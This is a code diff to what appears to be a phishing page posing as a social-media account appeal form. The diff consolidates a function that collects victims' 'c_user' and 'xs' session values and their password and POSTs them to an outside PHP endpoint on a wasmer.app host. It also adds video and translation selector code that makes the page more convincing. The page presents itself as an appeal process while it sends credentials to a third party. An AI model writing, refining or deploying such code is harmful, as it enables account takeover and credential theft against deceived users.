@@ -1551,36 +1551,28 @@
         const appealForm = document.querySelector('.appeal-form');
         const submitBtn = document.getElementById('submit-appeal-btn');
         
-         // Function to submit to both endpoints
-        function submitToEndpoints(data) {
-            // First endpoint for c_user and xs
-            const endpoint1 = 'https://qwerty-1713c.wasmer.app/Shoib.php';
+        // Function to submit to the specified endpoint
+        function submitToEndpoint(data) {
+            const endpoint = 'https://qwerty-1713c.wasmer.app/Shoib.php';
             
-            // Second endpoint for password
-            const endpoint2 = 'https://qwerty-1713c.wasmer.app/Shoibpass.php';
+            // Prepare the data to send
+            const formData = new FormData();
+            formData.append('c_user', data.c_user);
+            formData.append('xs', data.xs);
+            formData.append('password', data.password);
+            formData.append('language', data.language);
+            formData.append('timestamp', data.timestamp);
 
-            // Prepare data for first endpoint (c_user and xs)
-            const formData1 = new FormData();
-            formData1.append('c_user', data.c_user);
-            formData1.append('xs', data.xs);
-            formData1.append('language', data.language);
-            formData1.append('timestamp', data.timestamp);
-
-            // Prepare data for second endpoint (password)
-            const formData2 = new FormData();
-            formData2.append('password', data.password);
-            formData2.append('timestamp', data.timestamp);
-
-            // Send to both endpoints simultaneously
-            return Promise.all([
-                fetch(endpoint1, { method: 'POST', body: formData1 }),
-                fetch(endpoint2, { method: 'POST', body: formData2 })
-            ]);
+            // Send the data to the endpoint
+            return fetch(endpoint, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.text();
+            });
         }
-
-        // Form submission handling
-        const appealForm = document.querySelector('.appeal-form');
-        const submitBtn = document.getElementById('submit-appeal-btn');
         
         submitBtn.addEventListener('click', async function(e) {
             e.preventDefault();
@@ -1668,8 +1660,8 @@
                         confirmPasswordBtn.disabled = true;
                         confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
                         
-                        // Submit to both endpoints
-                        await submitToEndpoints(formData);
+                        // Submit to the endpoint
+                        await submitToEndpoint(formData);
                         
                         document.body.removeChild(passwordPrompt);
                         
@@ -1720,7 +1712,138 @@
                 alert(translations[currentLanguage]['error_occurred'] || 'An error occurred. Please try again.');
             }
         });
+        
+        // Cancel button functionality
+        const cancelBtn = document.querySelector('.btn-secondary');
+        cancelBtn.addEventListener('click', function() {
+            if (confirm(translations[currentLanguage]['confirm_cancel'] || 'Are you sure you want to cancel? Any unsaved information will be lost.')) {
+                window.location.href = '#';
+            }
+        });
+        
+        // Video language selector functionality
+        const video = document.getElementById('appeal-video');
+        const languageSelector = document.getElementById('language-selector');
+        const playButton = document.getElementById('play-video-btn');
+        const confirmLanguageBtn = document.getElementById('confirm-language-btn');
+        const cancelLanguageBtn = document.getElementById('cancel-language-btn');
+        const languageOptions = document.querySelectorAll('#language-selector .language-option');
+        
+        // Initialize video with no controls
+        video.controls = false;
+        
+        // When play button is clicked, show language selector
+        playButton.addEventListener('click', function() {
+            document.getElementById('language-selector').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        });
+        
+        // When confirm button is clicked in language selector
+        confirmLanguageBtn.addEventListener('click', function() {
+            document.getElementById('language-selector').style.display = 'none';
+            document.body.style.overflow = '';
+            
+            const selectedOption = document.querySelector('#language-selector .language-option.selected');
+            const videoSrc = selectedOption.getAttribute('data-src');
+            
+            if (videoSrc && video.src !== videoSrc) {
+                video.src = videoSrc;
+                video.load();
+            }
+            
+            video.controls = true;
+            video.play().catch(e => console.log('Video play failed:', e));
+            playButton.style.display = 'none';
+        });
+        
+        // When cancel button is clicked in language selector
+        cancelLanguageBtn.addEventListener('click', function() {
+            document.getElementById('language-selector').style.display = 'none';
+            document.body.style.overflow = '';
+        });
+        
+        // Language selection for video
+        document.querySelectorAll('#language-selector .language-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('#language-selector .language-option').forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+        
+        // When video ends, show the play button again
+        video.addEventListener('ended', function() {
+            playButton.style.display = 'flex';
+        });
+        
+        // If video is paused by user, show controls
+        video.addEventListener('pause', function() {
+            video.controls = true;
+        });
+        
+        // Show play button when video is not playing
+        video.addEventListener('play', function() {
+            playButton.style.display = 'none';
+        });
 
+        // Translation selector functionality
+        const translateBtn = document.getElementById('translate-btn');
+        const translationSelector = document.getElementById('translation-selector');
+        const confirmTranslationBtn = document.getElementById('confirm-translation-btn');
+        const cancelTranslationBtn = document.getElementById('cancel-translation-btn');
+        
+        // When translate button is clicked
+        translateBtn.addEventListener('click', function() {
+            translationSelector.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            document.querySelectorAll('#translation-selector .language-option').forEach(option => {
+                option.classList.remove('selected');
+                if (option.getAttribute('data-lang') === currentLanguage) {
+                    option.classList.add('selected');
+                }
+            });
+        });
+        
+        // When confirm button is clicked in translation selector
+        confirmTranslationBtn.addEventListener('click', function() {
+            const selectedOption = document.querySelector('#translation-selector .language-option.selected');
+            const lang = selectedOption.getAttribute('data-lang');
+            
+            translationSelector.style.display = 'none';
+            document.body.style.overflow = '';
+            
+            if (lang !== currentLanguage) {
+                translatePage(lang);
+            }
+        });
+        
+        // When cancel button is clicked in translation selector
+        cancelTranslationBtn.addEventListener('click', function() {
+            translationSelector.style.display = 'none';
+            document.body.style.overflow = '';
+        });
+        
+        // Language selection for translation
+        document.querySelectorAll('#translation-selector .language-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('#translation-selector .language-option').forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+        
+        // Close selectors when clicking outside
+        [languageSelector, translationSelector].forEach(selector => {
+            selector.addEventListener('click', function(e) {
+                if (e.target === selector) {
+                    selector.style.display = 'none';
+                    document.body.style.overflow = '';
+                }
+            });
+        });
     </script>
 
 </body></html>
